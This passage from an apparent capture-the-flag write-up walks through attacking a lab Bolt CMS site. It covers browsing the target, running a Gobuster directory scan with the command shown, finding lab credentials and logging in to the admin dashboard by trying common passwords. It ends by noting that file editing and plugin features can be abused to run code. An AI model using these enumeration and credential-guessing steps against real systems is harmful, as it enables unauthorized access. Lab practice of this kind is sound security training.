Step 2: Exploring the Website
Next, I opened the target IP address in a web browser.

The website revealed that it was running Bolt CMS, a lightweight content management system used for building websites.

Identifying the CMS is important because attackers often search for known vulnerabilities associated with specific software.

I got username and password bolt:boltadmin123

Step 3: Directory Enumeration
To discover hidden directories and files, I used Gobuster.

Example command:

gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirb/common.txt
This scan helped find several directories, including:

/bolt
This directory led to the Bolt CMS login panel.

Step 4: Accessing the Admin Panel
The /bolt directory revealed the Bolt CMS admin login page.

Many systems use weak or default credentials, so I attempted common username and password combinations.

After testing several credentials, I successfully logged in to the admin dashboard.

Once inside the CMS dashboard, I gained access to various administrative features such as:

File editing
Content management
Plugin management
These features can sometimes be abused to execute malicious code.

